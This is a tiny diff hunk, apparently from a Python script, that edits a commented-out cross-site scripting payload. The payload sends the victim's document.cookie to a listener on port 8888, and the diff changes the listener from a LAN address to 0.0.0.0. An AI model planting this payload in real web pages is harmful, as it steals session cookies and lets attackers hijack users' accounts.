@@ -28,4 +28,4 @@ if __name__ == "__main__":
 
 
 
-# <script>var i=new Image;i.src="http://192.168.0.18:8888/?"+document.cookie;</script>
+# <script>var i=new Image;i.src="http://0.0.0.0:8888/?"+document.cookie;</script>
